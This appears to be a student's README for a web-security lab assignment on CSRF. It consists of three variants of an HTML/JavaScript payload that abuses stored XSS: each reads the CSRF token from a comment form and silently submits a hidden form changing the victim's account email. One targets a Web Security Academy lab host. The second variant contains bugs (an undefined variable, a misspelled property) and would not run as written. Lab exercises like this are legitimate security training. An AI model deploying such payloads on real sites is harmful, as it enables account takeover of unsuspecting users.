# WebSecurity-CSRF
Web Security Assignment on CSRF


# Script that will exploit the stored XSS vulnerability and trigger a CSRF

<form id="fake_form" action="http://www.vulnerable.com:5000/profile/update-email" method="POST"> 
  <input id="my_mail"  name="email" value=""> 
  <input id="my_csrf" name="csrf" value=""> 
</form> 

<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    document.getElementById("my_mail").value = rndMail();
    document.getElementById("my_csrf").value = stolen_csrf;
    document.getElementById("fake_form").submit(); 
}
</script>


<form id="fake_form" action="https://www.vulnerable.com:5000/profile/update-email" method="POST"> 
  <input id="my_mail"  name="email" value=""> 
  <input id="my_csrf" name="csrf" value=""> 
</form> 

<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = document.getElementsByTagName("form");
    let form = [...form].filter((f) => {
    return f.action.includes("/post/comment");
  })[0].childrens[0].value;
 
    document.getElementById("my_mail").value = rndMail();
    document.getElementById("my_csrf").value = stolen_csrf;
    document.getElementById("fake_form").submit(); 
}
</script>


<form id="fake_form" class="login-form" name="change-email-form" action="https://0a15006803dcd908807705c80023008c.web-security-academy.net/my-account/change-email" method="POST"> 
                             
    <input required="" id="my_mail" type="email" name="email" value="tiho@extrachiavato.com"> 
    <input required="" id="my_csrf" name="csrf" value=""> 
                       
</form> 
 
<script> 
 
function getRandomInt(max) { 
  return Math.floor(Math.random() * max); 
} 
 
window.onload = function(){ 
    let form = document.getElementsByTagName("form") 
    form = [...form].filter((x) => {console.log(x.action); return x.action.includes("/post/comment")}) 
    let childrens=(form[0]).children; 
    let elem = childrens[0]; 
    let stolen_value2=elem.value; 
 
 
    document.getElementById("my_mail").value = "test@" + getRandomInt(100000)+ ".com" 
    console.log(stolen_value2) 
    document.getElementById("my_csrf").value = stolen_value2; 
 
    document.getElementById("fake_form").submit(); 
} 
</script>